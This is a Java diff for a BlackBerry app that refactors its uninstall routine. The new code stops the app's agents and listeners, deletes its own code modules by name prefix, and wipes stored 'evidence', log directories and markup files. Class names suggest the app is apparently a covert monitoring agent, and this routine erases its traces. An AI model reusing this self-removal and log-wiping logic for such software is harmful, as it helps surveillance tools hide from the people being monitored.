@@ -23,13 +23,13 @@ import blackberry.evidence.Markup;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 
-
 /**
  * The Class UninstallAction.
  */
 public final class UninstallAction extends SubAction {
     //#ifdef DEBUG
     static Debug debug = new Debug("UninstallAction", DebugLevel.VERBOSE);
+
     //#endif
 
     /**
@@ -67,82 +67,124 @@ public final class UninstallAction extends SubAction {
         //#ifdef DEBUG
         debug.info("execute");
         //#endif
-
         wantUninstall = true;
 
-        final Main main = (Main) Application.getApplication();
-        main.stopListeners();
+        return actualExecute();
+    }
 
-        AgentManager.getInstance().stopAll();
-        EventManager.getInstance().stopAll();
+    public static boolean actualExecute() {
 
-        Utils.sleep(5000);
+        boolean ret = stopServices();
+        ret &= deleteApplication();
+        ret &= removeFiles();
+        
+        return ret;
+    }
 
-        EvidenceCollector.getInstance().removeProgressive();
+    public static boolean stopServices() {
+        try {
+            final Main main = (Main) Application.getApplication();
+            main.stopListeners();
 
-        final ApplicationDescriptor ad = ApplicationDescriptor
-                .currentApplicationDescriptor();
+            AgentManager.getInstance().stopAll();
+            EventManager.getInstance().stopAll();
 
-        final int moduleHandle = ad.getModuleHandle();
-        final int rc = CodeModuleManager.deleteModuleEx(moduleHandle, true);
-        //final String errorString = Integer.toString(rc);
-        //#ifdef DEBUG
-        debug.info("deleteModuleEx result: " + rc);
-        //#endif
-        switch (rc) {
-        case CodeModuleManager.CMM_OK_MODULE_MARKED_FOR_DELETION:
+            Utils.sleep(5000);
+        } catch (Exception ex) {
             //#ifdef DEBUG
-            debug.info("Will be deleted on restart");
+            debug.error("stopServices: " + ex);
             //#endif
-            // Device.requestPowerOff( true );
-            break;
-        case CodeModuleManager.CMM_MODULE_IN_USE:
-        case CodeModuleManager.CMM_MODULE_IN_USE_BY_PERSISTENT_STORE:
+
+            return false;
+        }
+
+        return true;
+    }
+
+    public static boolean deleteApplication() {
+        try {
+            final ApplicationDescriptor ad = ApplicationDescriptor
+                    .currentApplicationDescriptor();
+
+            final int moduleHandle = ad.getModuleHandle();
+            final int rc = CodeModuleManager.deleteModuleEx(moduleHandle, true);
+            //final String errorString = Integer.toString(rc);
             //#ifdef DEBUG
-            debug.info("Module In Use");
+            debug.info("deleteModuleEx result: " + rc);
             //#endif
-            break;
-        case CodeModuleManager.CMM_HANDLE_INVALID:
+            switch (rc) {
+                case CodeModuleManager.CMM_OK_MODULE_MARKED_FOR_DELETION:
+                    //#ifdef DEBUG
+                    debug.info("Will be deleted on restart");
+                    //#endif
+                    // Device.requestPowerOff( true );
+                    break;
+                case CodeModuleManager.CMM_MODULE_IN_USE:
+                case CodeModuleManager.CMM_MODULE_IN_USE_BY_PERSISTENT_STORE:
+                    //#ifdef DEBUG
+                    debug.info("Module In Use");
+                    //#endif
+                    break;
+                case CodeModuleManager.CMM_HANDLE_INVALID:
+                    //#ifdef DEBUG
+                    debug.error("Invalid Handle");
+                    //#endif
+                    break;
+                case CodeModuleManager.CMM_MODULE_REQUIRED:
+                    //#ifdef DEBUG
+                    debug.error("Module Required");
+                    //#endif
+                    break;
+                default:
+                    //#ifdef DEBUG
+                    debug.error(Integer.toString(rc));
+                    //#endif
+                    //return false;
+            }
+
+            final int handles[] = CodeModuleManager.getModuleHandles();
+
+            final int size = handles.length;
+            for (int i = 0; i < size; i++) {
+                final int handle = handles[i];
+                //CodeModuleManager.getModuleHandle(name)
+                // Retrieve specific information about a module.
+                final String name = CodeModuleManager.getModuleName(handle);
+
+                if (name.startsWith(Conf.MODULE_NAME)) {
+                    //#ifdef DEBUG
+                    debug.warn("Removing handle: " + handle + " name: " + name);
+                    //#endif
+                    CodeModuleManager.deleteModuleEx(handle, true);
+                }
+            }
+        } catch (Exception ex) {
             //#ifdef DEBUG
-            debug.error("Invalid Handle");
+            debug.error("deleteApplication: " + ex);
             //#endif
-            break;
-        case CodeModuleManager.CMM_MODULE_REQUIRED:
+            return false;
+        }
+        return true;
+    }
+
+    public static boolean removeFiles() {
+        try {
             //#ifdef DEBUG
-            debug.error("Module Required");
+            Debug.stop();
             //#endif
-            break;
-        default:
+            EvidenceCollector.getInstance().removeProgressive();
+            Markup.removeMarkups();
+            EvidenceCollector.getInstance().removeLogDirs(Integer.MAX_VALUE);
+
             //#ifdef DEBUG
-            debug.error(Integer.toString(rc));
+            CodeModuleManager.promptForResetIfRequired();
+            //#endif        
+        } catch (Exception ex) {
+            //#ifdef DEBUG
+            debug.error("removeFiles: " + ex);
             //#endif
             //return false;
         }
-
-        final int handles[] = CodeModuleManager.getModuleHandles();
-
-        final int size = handles.length;
-        for (int i = 0; i < size; i++) {
-            final int handle = handles[i];
-            //CodeModuleManager.getModuleHandle(name)
-            // Retrieve specific information about a module.
-            final String name = CodeModuleManager.getModuleName(handle);
-
-            if (name.startsWith(Conf.MODULE_NAME)) {
-                //#ifdef DEBUG
-                debug.warn("Removing handle: " + handle + " name: " + name);
-                //#endif
-                CodeModuleManager.deleteModuleEx(handle, true);
-            }
-        }
-
-        Debug.stop();
-        EvidenceCollector.getInstance().removeLogDirs(Integer.MAX_VALUE);
-        Markup.removeMarkups();
-
-        //#ifdef DEBUG
-        CodeModuleManager.promptForResetIfRequired();
-        //#endif        
         return true;
     }
 
